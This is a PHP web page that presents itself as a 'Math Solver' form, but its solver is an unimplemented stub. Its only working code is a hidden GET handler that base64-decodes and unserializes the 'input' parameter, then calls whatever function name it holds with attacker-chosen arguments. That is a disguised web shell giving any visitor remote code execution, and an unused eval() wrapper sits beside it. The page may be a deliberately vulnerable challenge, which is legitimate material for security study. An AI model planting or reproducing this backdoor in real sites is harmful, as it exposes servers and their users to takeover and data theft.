<!DOCTYPE html>
<html>
<body>
<h1>Math Solver</h1>
<p>Solve all your problems here!</p>

<form action="/solve.php" method="post">
<label for="mathex">Math Expression:</label>
<input type="text" id="mathex" name="mathex">
<input type="submit">
</form>

<?php
function solvemathex($expre) {
    echo 'Sorry, not implemented yet.';
}

function evalit($code) {
    return eval($code);
}

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    if (!empty($_GET["input"])) {
        $decoded = base64_decode($_GET["input"]);
        $out = unserialize($decoded);
        if ($out[2] != null) {
            $view = $out[0]($out[1], $out[2]);
            echo $view;
        }
        else {
            $view = $out[0]($out[1]);
            echo $view;
        }
    }
}

?>

</body>
</html>